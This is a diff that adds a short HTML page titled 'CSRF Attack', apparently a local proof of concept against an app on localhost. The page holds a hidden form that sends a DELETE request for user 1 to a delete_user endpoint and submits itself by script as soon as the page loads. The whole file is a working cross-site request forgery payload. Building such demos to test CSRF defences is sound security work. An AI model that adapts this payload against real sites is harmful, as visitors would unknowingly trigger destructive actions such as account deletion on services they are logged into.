@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>CSRF Attack</h1>
+
+    <form action="http://localhost:8001/api/delete_user/1" method="POST">
+      <input type="hidden" name="_method" value="DELETE" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
